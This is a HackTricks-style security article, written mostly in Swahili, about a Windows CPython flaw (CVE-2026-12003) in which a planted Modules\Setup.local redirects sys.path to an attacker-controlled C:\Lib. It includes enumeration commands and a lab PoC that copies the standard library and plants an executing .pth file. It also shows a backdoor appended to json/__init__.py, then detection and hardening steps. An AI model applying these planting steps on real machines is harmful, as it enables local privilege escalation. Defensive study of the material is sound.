# Windows CPython Build-Landmark na `sys.path` Hijacking

{{#include ../../../banners/hacktricks-training.md}}

Runtime inaweza kuhifadhi relative paths zilizokusudiwa kutumika kwenye build tree pekee. Ikiwa runtime yenye privileged iliyosakinishwa itatathmini mojawapo ya paths hizo na kuielekeza kwenye directory inayoweza kuandikwa na low-privilege user, attacker anaweza kuweka **build landmark** inayotarajiwa na kuifanya runtime iamini library prefix mbadala. CVE-2026-12003 ni mfano wa Windows CPython: `Modules\Setup.local` iliyowekwa inaweza kuelekeza upya ingizo la standard library katika `sys.path` bila kurekebisha installation ya Python iliyolindwa.<sup>[[1]](#references)[[2]](#references)</sup>

## Mlolongo wa uundaji wa path wa CPython

Windows builds zilizoathiriwa zilikompiliwa kwa `VPATH=..\..` na kuufichua kama `sys._vpath`. Fallback iliyo hatarini katika `Modules/getpath.py` ilichukulia `VPATH\Modules\Setup.local` kama ushahidi kwamba interpreter ilikuwa ikiendeshwa kutoka source tree; data flow ifuatayo hubadilisha thamani hiyo ya wakati wa build kuwa primitive ya runtime ya search-path.<sup>[[1]](#references)[[2]](#references)</sup>

| Hatua | Thamani iliyotokana kwa `C:\Program Files\Python314\python.exe` |
| --- | --- |
| Build path iliyokompiliwa | `VPATH=..\..` |
| Build landmark ya runtime | `C:\Program Files\Python314\..\..\Modules\Setup.local` |
| Landmark iliyoundwa na attacker | `C:\Modules\Setup.local` |
| `build_prefix` iliyochaguliwa | `C:\` |
| Standard library iliyochaguliwa | `C:\Lib` |
| Matokeo | `C:\Lib` inayodhibitiwa na attacker inaongezwa kwenye `sys.path` |

Check hii ni fallback inayotumika wakati `pybuilddir.txt` maalum iliyo karibu na executable haipo au haisomeki. Hili ni muhimu kwa sababu low-privilege user anaweza kushindwa kubadilisha `C:\Program Files\Python314`, lakini bado akaweza kuunda directories mpya kwenye `C:\`. Mchakato wa baadaye wa privileged `python.exe` hupakia Python code kwa kutumia access token yake yenyewe.<sup>[[1]](#references)[[2]](#references)</sup>

### Masharti ya awali

Chukulia hili kama privilege boundary pekee wakati masharti haya yote yanatimizwa:<sup>[[1]](#references)[[2]](#references)</sup>

- Target ni **Windows CPython** build iliyoathiriwa; path logic iliyo hatarini si sifa ya Python language.
- Directory inayopatikana kwa kutathmini `..\..` kutoka directory iliyo na `python.exe` inamruhusu less-privileged user kuunda landmark na `Lib` tree.
- Higher-privileged user, service, installer, au software-deployment account baadaye huanzisha interpreter hiyo.
- Hakuna path-isolation configuration inayobatilisha vulnerable discovery path.

## Enumeration

Kagua thamani iliyokompiliwa pamoja na search path inayotumika kwa uhalisia. Thamani iliyo wazi ya `..\..` ni dalili muhimu, lakini si uthibitisho wa exploitability: pia tathmini path, test ACLs, na thibitisha kwamba landmark iliyowekwa itakuwa nje ya installation iliyolindwa.<sup>[[1]](#references)[[2]](#references)</sup>
```powershell
python -c "import os,sys; print(sys.executable); print(getattr(sys,'_vpath',None)); print(*sys.path, sep='\n')"

$pythonDir = python -c "import os,sys; print(os.path.dirname(sys.executable))"
$prefix = [IO.Path]::GetFullPath((Join-Path $pythonDir '..\..'))
$prefix
icacls $prefix
```
Usiweke assessment kwenye installers rasmi pekee. Kwa kila product inayobundle `python.exe`, resolve `sys._vpath` yake ikilinganishwa na directory halisi ya executable, kisha kagua ACLs kwenye locations za `Modules` na `Lib` zitakazopatikana. Installation path iliyo ndani zaidi inaweza ku-resolve kwenye application au vendor directory nyingine inayoweza kuandikwa badala ya `C:\`.<sup>[[1]](#references)</sup>

## Mtiririko wa exploitation wa Lab

PoC ifuatayo ya Lab inaiga sehemu ya kutosha ya legitimate runtime chini ya prefix iliyochaguliwa ili Python i-initialize, inaongeza line ya executable `.pth`, na hatimaye inaunda landmark. Unda payload kabla ya landmark ili kuepuka kuiacha interpreter ikiwa imeelekezwa kwa muda kwenye library tree isiyokamilika.<sup>[[1]](#references)</sup>
```powershell
$pythonDir = python -c "import os,sys; print(os.path.dirname(sys.executable))"
$root = [IO.Path]::GetFullPath((Join-Path $pythonDir '..\..'))
robocopy /E "$pythonDir\Lib" "$root\Lib" | Out-Null
robocopy /E "$pythonDir\DLLs" "$root\Lib" | Out-Null
New-Item "$root\Lib\site-packages" -ItemType Directory -Force | Out-Null
'import subprocess;subprocess.run(["cmd.exe","/c","whoami > %TEMP%\\py-landmark.txt"],shell=False)' |
Set-Content "$root\Lib\site-packages\audit.pth" -Encoding Ascii
New-Item "$root\Modules" -ItemType Directory -Force | Out-Null
New-Item "$root\Modules\Setup.local" -ItemType File -Force | Out-Null
```
Wakati wa uanzishaji wa kawaida wa site, Python huchakata faili za `.pth` katika saraka zinazotambulika za site-packages. Mistari inayoanza na `import` ikifuatiwa na nafasi nyeupe pekee ndiyo hutekelezwa, na statement inayoweza kutekelezwa lazima ibaki kwenye mstari mmoja wa kimwili; `python -S` hukandamiza uingizaji wa kiotomatiki wa `site`, na hivyo kuzuia trigger hii.<sup>[[1]](#references)[[4]](#references)</sup>

### Njia mbadala inayochochewa na import

Utekelezaji wakati wa uanzishaji si wa lazima. Baada ya kuunda upya mti halali wa library, weka backdoor kwenye module ambayo script yenye privileged hu-import kwa kutabirika. Kwa mfano, kuongeza code kwenye `Lib\json\__init__.py` iliyopandikizwa hutekelezwa victim anapo-import `json`; kuchagua module ya kuaminika lakini ambayo hai-importwi kwa wote kunaweza kufanya trigger isiwe na kelele nyingi.<sup>[[1]](#references)</sup>
```powershell
'open(r"C:\Windows\Temp\json-import-token.txt","w").write(__import__("subprocess").check_output(["whoami"]).decode())' |
Add-Content "$root\Lib\json\__init__.py" -Encoding Ascii
```
Toleo hili bado hurithi token ya mchakato wa importing, lakini linategemea application inayolengwa ku-import module iliyorekebishwa. Hifadhi tabia ya awali ya module unapojaribu software halisi, la sivyo import inaweza kushindikana kabla workflow iliyokusudiwa yenye privileged kukamilika.<sup>[[1]](#references)</sup>

## Upandaji kabla ya usakinishaji

Upandaji wa search-path unaweza kufanyika kabla ya usakinishaji. Mtumiaji mwenye low privilege anaweza kuandaa `Lib` tree na `Modules\Setup.local` za baadaye, kisha kusubiri software portal yenye privileged, workflow ya help-desk, au deployment system ifanye usakinishaji wa all-users. Installers zinazoanzisha interpreter mpya ili kusakinisha packages au kufanya precompile ya standard library zinaweza ku-trigger payload chini ya deployment account bila administrator kufungua Python mwenyewe.<sup>[[1]](#references)</sup>

Hili pia hubadilisha ukaguzi wa deployment: kagua writable ancestors na landmark/library directories zilizokuwepo tayari **kabla** ya kusakinisha au kuboresha bundled runtime, badala ya kuangalia tu installation directory ya mwisho baada ya deployment.<sup>[[1]](#references)</sup>

## Utambuzi na hardening

Host pivots muhimu ni landmark na library tree zisizotarajiwa, zikifuatiwa na uzinduzi wa privileged Python. Tafuta `Modules\Setup.local`, `Lib\site-packages\*.pth` zilizo kwenye root au sehemu nyingine isiyotarajiwa, standard-library packages zilizokopiwa, na module files ambazo owner au creation time yake inatofautiana na installation iliyolindwa. Correlate uundaji wake na standard user pamoja na `python.exe` yenye elevated inayoanzisha `cmd.exe`, `powershell.exe`, account-management tools, au children wengine wasio wa kawaida.<sup>[[1]](#references)</sup>
```powershell
Get-Item C:\Modules\Setup.local -ErrorAction SilentlyContinue | Format-List FullName,CreationTime,LastWriteTime
Get-ChildItem C:\Lib\site-packages -Filter *.pth -ErrorAction SilentlyContinue |
Select-Object FullName,CreationTime,LastWriteTime
Get-ChildItem C:\Lib -Recurse -File -ErrorAction SilentlyContinue |
Get-Acl | Where-Object Owner -notmatch 'TrustedInstaller|Administrators|SYSTEM'
```
Marekebisho ya upstream yanaondoa fallback ya `VPATH\Modules\Setup.local` na kufanya `pybuilddir.txt` kuwa kiashiria pekee cha build-tree. Pendelea build iliyorekebishwa au installation ya kila mtumiaji inayosimamiwa na current Python install manager. Pale ambapo upgrading haiwezekani kwa muda, linda ancestor iliyotatuliwa na uunde `Modules` mapema kwa ACLs zenye vizuizi; faili za `._pth` zinazodhibitiwa au `PYTHONHOME` pia zinaweza kubadilisha discovery, lakini zinahitaji testing ya application compatibility.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## References

- [1] [Bishop Fox - CVE-2026-12003: Search-Path Hijacking na Local Privilege Escalation katika Windows CPython](https://bishopfox.com/blog/python-software-foundation-python-3-11-0a3-to-3-15-0b2)
- [2] [CPython issue #151544 - In-tree search paths zinaweza kuwezeshwa bila kurekebisha install directory](https://github.com/python/cpython/issues/151544)
- [3] [CPython pull request #151545 - Ondoa fallback ya `VPATH/Modules/Setup.local`](https://github.com/python/cpython/pull/151545)
- [4] [Python documentation - Faili za usanidi wa path za `site`](https://docs.python.org/3/library/site.html)
{{#include ../../../banners/hacktricks-training.md}}
